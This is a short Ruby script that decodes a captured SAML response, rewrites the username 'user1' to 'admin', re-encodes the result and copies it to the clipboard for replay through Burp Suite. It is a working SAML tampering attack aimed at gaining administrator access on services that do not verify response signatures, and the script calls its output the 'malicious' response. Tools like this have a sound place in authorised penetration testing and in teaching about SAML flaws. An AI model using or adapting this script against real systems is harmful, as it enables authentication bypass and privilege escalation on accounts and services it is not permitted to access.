# Import required libraries
require 'uri'
require 'base64'

# Retrieve the SAMLResponse value from the command line argument and unescape it
str = URI.unescape ARGV[0]

# Decode the base64-encoded SAMLResponse value and save it to a file
response = Base64.decode64(str)
File.write("original_response.xml", response)

# Replace the user1 value in the SAMLResponse with admin and save the new response to a file
malicious_response = response.gsub("user1", "admin")
File.write("malicious_response.xml", malicious_response)

# Encode the malicious_response as base64 and escape any non-alphanumeric characters
output = URI.escape(Base64.strict_encode64(malicious_response), "+/=")

# Copy the encoded response to the clipboard for easy pasting into Burp Suite
IO.popen('pbcopy', 'w') { |f| f << output }

# Print some output to the console to indicate what was done and open the original and malicious responses in Chrome
puts ""
puts "Response saved to original_response.xml file."
puts "Malicious Response saved to malicious_response.xml file."
puts "Output copied to clipboard!"
system('open', '-a', 'Google Chrome', 'original_response.xml'); 
system('open', '-a', 'Google Chrome', 'malicious_response.xml')